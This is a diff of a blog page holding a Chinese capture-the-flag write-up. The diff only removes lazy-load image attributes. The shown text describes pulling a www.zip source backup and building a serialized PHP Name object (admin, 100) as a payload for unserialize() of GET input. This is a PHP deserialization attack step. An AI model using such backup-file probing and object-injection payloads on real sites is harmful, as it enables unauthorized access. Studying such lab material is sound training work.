@@ -201,7 +201,7 @@
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>这一题有两个地方卡住我了，第一个是没有想到备份名叫<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>.<br>第二个是public、protected与private在序列化时的区别。<br><img src="/img/27.png" srcset="/img/loading.gif" alt=""><br>于是在url栏中输入<a href="http://www.zip得到网站源码，发现flag.php进行提交，错误。" target="_blank" rel="noopener">www.zip得到网站源码，发现flag.php进行提交，错误。</a><br>观看源码：<br>index.php</p>
+      		<p>这一题有两个地方卡住我了，第一个是没有想到备份名叫<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>.<br>第二个是public、protected与private在序列化时的区别。<br><img src="/img/27.png" alt=""><br>于是在url栏中输入<a href="http://www.zip得到网站源码，发现flag.php进行提交，错误。" target="_blank" rel="noopener">www.zip得到网站源码，发现flag.php进行提交，错误。</a><br>观看源码：<br>index.php</p>
 <pre><code>&lt;?php
 include &#39;class.php&#39;;
 $select = $_GET[&#39;select&#39;];
@@ -257,7 +257,7 @@ $res=unserialize(@$select);
 }
 $select = new Name(&#39;admin&#39;,100);
 $res=serialize(@$select);
-echo $res;</code></pre><p><img src="/img/28.png" srcset="/img/loading.gif" alt=""></p>
+echo $res;</code></pre><p><img src="/img/28.png" alt=""></p>
 <blockquote>
 <p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p>
 </blockquote>
